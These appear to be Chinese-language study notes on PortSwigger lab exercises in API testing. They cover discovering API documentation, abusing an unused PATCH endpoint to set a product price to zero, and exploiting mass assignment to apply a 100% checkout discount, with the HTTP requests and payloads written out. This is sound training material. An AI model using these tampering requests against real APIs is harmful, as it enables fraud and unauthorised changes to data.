
## 发现 API 文档
实验：利用文档攻击 API 端点
https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation

在站点地图中发现内容
GET /api/ HTTP/2
响应为
REST API
Verb	Endpoint	Parameters	Response
GET	/user/[username: String]	{ }	200 OK, User
DELETE	/user/[username: String]	{ }	200 OK, Result
PATCH	/user/[username: String]	{"email": String}	200 OK, User
若点击各种功能对应的行，将出现使用示例


## 识别 API 端点

实验：寻找并利用未使用的 API 端点
https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint

在sitemap中使用内容发现
对脚本的请求为
GET /resources/js/api/productPrice.js HTTP/2
脚本内容为
```javascript
const handleResponse = (target) => (response) => {
    if (response.error) {
        showErrorMessage(target, `Failed to get price: ${response.type}: ${response.error} (${response.code})`);
    } else {
        setPrice(response.price);
        if (response.message) {
            showProductMessage(target, response.message);
        }
    }
};

const loadPricing = (productId) => {
    const url = new URL(location);
    fetch(`//${url.host}/api/products/${encodeURIComponent(productId)}/price`)
        .then(res => res.json())
        .then(handleResponse(getAddToCartForm()));
};

window.onload = () => {
    const url = new URL(location);
    const productId = url.searchParams.get('productId');
    if (url.pathname.startsWith("/product") && productId != null) {
        loadPricing(productId);
    }
};
```

查看脚本中发现的url
GET /api/products/1/price HTTP/2
响应为
```json
{
    "price":"$1337.00",
    "message":"21 people have this in their baskets right now"
}
```

访问商品页面时，发现对应内容
GET /api/products/1/price HTTP/2
```json
{
    "price":"$1337.00",
    "message":"Your neighbor just bought 4 of these! Don't feel left out!"
}
```

将请求发送到攻击器中，使用http方法列表测试
其中 PATCH 方法
PATCH /api/products/1/price HTTP/2
响应为 400 Bad Request
```json
{
    "type":"ClientError",
    "code":400,
    "error":"Only 'application/json' Content-Type is supported"}
```
得到PATCH方法应当使用Json格式的信息

发送到重复器
发送
{"price":"0"}
得到
"error":"'price' parameter must be a valid non-negative integer"

发送
{"price":0}
得到
{"price":"$0.00"}

此时商品价格已经设置为0

## 寻找隐藏参数

### 批量赋值漏洞

实验：利用批量赋值漏洞
https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability

浏览到购物车页面时发现api
GET /api/checkout HTTP/2
响应为
```json
{
    "chosen_discount":{"percentage":0},
    "chosen_products":[
        {
            "product_id":"1",
            "name":"Lightweight \"l33t\" Leather Jacket",
            "quantity":1,
            "item_price":133700
        }
    ]
}
```

将get请求发送到攻击器，对http动词进行爆破
其中post方法
POST /api/checkout HTTP/2
得到
HTTP/2 400 Bad Request
```json
{
    "error":"Unexpected '}' at [line 1, column 11]"
}
```

将post方法发送到重复器，复制并修改get方法的json响应
POST /api/checkout HTTP/2
设置价格到0
"item_price":0
无效

设置折扣为100
"chosen_discount":{"percentage":0}
成功

示例解决方案：在进行结账操作时发现 POST 方法，并对参数进行测试来查看服务器的响应
> 前往购物车并点击"下单"。注意你购买时没有足够的信用额度
> 注意对于 /api/checkout，既有 GET 也有 POST API 请求
